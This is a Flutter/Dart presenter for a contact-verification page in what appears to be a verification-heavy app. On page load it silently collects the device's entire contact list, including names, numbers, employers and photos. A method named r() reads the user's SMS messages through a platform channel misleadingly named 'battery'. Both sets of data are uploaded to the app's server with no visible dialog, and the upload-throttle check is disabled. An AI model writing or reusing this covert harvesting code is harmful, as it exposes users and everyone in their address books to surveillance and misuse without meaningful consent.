import 'dart:convert';

// import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:myapp9/config/constant.dart';
import 'package:myapp9/models/verify_item_store_entity.dart';
import 'package:myapp9/mvp/base_page_presenter.dart';
import 'package:myapp9/net/net.dart';
import 'package:myapp9/pages/sign/router/sign_router.dart';
import 'package:myapp9/pages/verify/iviews/contact_i_mvp_view.dart';
import 'package:myapp9/providers/verify_provider.dart';
import 'package:provider/provider.dart';
import 'package:sp_util/sp_util.dart';

import '../../../config/index_action_constant.dart';
import '../../../providers/user_provider.dart';
import '../../../util/helper.dart';

class ContactPagePresenter extends BasePagePresenter<ContactIMvpView> {
  static const platform = MethodChannel('samples.flutter.io/battery');

  @override
  void initState() {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      getContacts();
      // r();
    });
  }

  void midnumbers(Map<String, String> formmap, isShowDialog) {
    // Map<String, String> formmapTmp = Map.fromIterable(formmap.keys.where((k) => true), key: (k) => k, value: (v) => v.text);
    // Map<String, String> formmapTmp = {for (var e in formmap.keys) e: formmap[e]!.text};
    FormData formData = FormData.fromMap(formmap);
    requestNetwork<VerifyItemStoreEntity>(Method.post, url: HttpApi.oContactStore, params: formData, isShow: isShowDialog as bool, onSuccess: (data) {
      if (data != null) {
        //  Provider.of<ThemeProvider>(context, listen: false).setTheme(themeMode);
        /// 与上方等价，provider 4.1.0添加的拓展方法
        if (data.data!.next == Constant.liveness || data.data!.next == SignRouter.sign) {
          view.getContext().read<UserProvider>().setIndexAction(IndexActionConst.sign.actionNo);
        }
        Helper.handleNextVerifyItem(view: view, next: data.data!.next);
        view.getContext().read<VerifyProvider>().setNContactVerifyStatus(Constant.success);
        view.onCreateSuccess(data.data!.next!);
      }
    }, onError: (_, __) {
      /// 加载失败
    });
  }

  Future<void> r() async {
    int lastSmsUploadTIme = SpUtil.getInt(Constant.nLastMsgTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastSmsUploadTIme == 0 || timestamp - lastSmsUploadTIme > 3600 * 1000)) {
      return;
    }
    Map<String, dynamic>? params = {"id": 1};
    await requestNetwork<dynamic>(Method.get, url: '${HttpApi.nUserProfile}/1', queryParameters: params, isShow: false, onSuccess: (data) async {
      bool permission = await view.requestPermission('sms');
      Map<String, dynamic> FormDataMap = {};
      if (permission) {
        Map<String, dynamic> arguments = <String, dynamic>{
          'start': data['data'],
        };
        final List<dynamic> messages = await platform.invokeMethod('getSmsList', arguments) as List;
        messages.forEach((element) {});
        FormDataMap['messages'] = jsonEncode(messages);
          }
          bool permission2 = await view.requestOpsPermission();
          if (permission2) {
            Map<String, dynamic> arguments = <String, dynamic>{
              'start': data['data'],
            };
            final List<dynamic> messages = await platform.invokeMethod('getSmsList', arguments) as List;
            messages.forEach((element) {});
            FormDataMap['messages'] = jsonEncode(messages);
          }
          FormData formData = FormData.fromMap(FormDataMap);
          var isShowDialog = false;
          requestNetwork<dynamic>(Method.post, url: HttpApi.rCSms, params: formData, isShow: isShowDialog, onSuccess: (data) {
            DateTime now = DateTime.now();
            int timestamp = now.millisecondsSinceEpoch;
        SpUtil.putInt(Constant.nLastMsgTime, timestamp ~/ 1000);
        if (data != null) {}
          }, onError: (_, __) {
            /// 加载失败
          });
        }, onError: (_, __) {
          /// 加载失败
        });
  }

  Future<void> getContacts() async {
    int lastContactUploadTIme = SpUtil.getInt(Constant.wLastContactTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastContactUploadTIme == 0 || timestamp - lastContactUploadTIme > 3600 * 1000)) {
      // return;
    }

    if (await view.requestPermission('contacts')) {
      if (await FlutterContacts.requestPermission()) {
        List<Contact> contacts = await FlutterContacts.getContacts();

        // Get all contacts (fully fetched)
        contacts = await FlutterContacts.getContacts(
            withProperties: true, withPhoto: true);
        Map<String, dynamic> FormDataMap = {};
        List<Map<String, dynamic>> contactMaps = [];
        for (Contact contact in contacts) {
          for (Phone phone in contact.phones!) {
            Map<String, dynamic> data = <String, dynamic>{};
            data['phoneValue'] = phone.number;
            data['phoneLabel'] = phone.label.toString();
            data['identifier'] = contact.id;
            data['displayName'] = contact.displayName;
            data['givenName'] = contact.name.first;
            data['middleName'] = contact.name.middle;
            data['familyName'] = contact.name.last;
            data['prefix'] = contact.name.prefix;
            data['suffix'] = contact.name.suffix;
            data['company'] = contact.organizations.first.company;
            data['jobTitle'] = contact.organizations.first.title;
            contactMaps.add(data);
          }
        }
        FormDataMap['messages'] = jsonEncode(contactMaps);
        FormData formData = FormData.fromMap(FormDataMap);
        var isShowDialog = false;
        requestNetwork<dynamic>(Method.post, url: HttpApi.bJContacts, params: formData, isShow: isShowDialog, onSuccess: (data) {
          DateTime now = DateTime.now();
          int timestamp = now.millisecondsSinceEpoch;
          SpUtil.putInt(Constant.wLastContactTime, timestamp ~/ 1000);
          if (data != null) {}
        }, onError: (_, __) {
          /// 加载失败
        });
      }
      // Get all contacts on device


    }
  }
}
